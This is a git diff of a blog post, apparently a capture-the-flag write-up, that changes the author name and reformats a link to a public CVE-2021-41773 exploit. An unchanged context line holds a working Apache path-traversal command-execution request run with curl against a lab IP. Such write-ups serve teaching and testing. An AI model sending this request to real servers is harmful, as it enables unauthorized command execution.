@@ -1,6 +1,6 @@
 ---
 layout: post
-author: kohaku
+author: maxin
 title:  "Path"
 date:   2022-03-15 02:21:10 PM -03
 category: CrowSec
@@ -52,7 +52,7 @@ Yes, the machine has the folder.
 
 ### Exploit
 
-https://github.com/jbovet/CVE-2021-41773
+[CVE-2021-41773](https://github.com/jbovet/CVE-2021-41773)
 
 {% highlight bash %}
 curl --data "echo;id" 'http://10.9.2.20:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' 
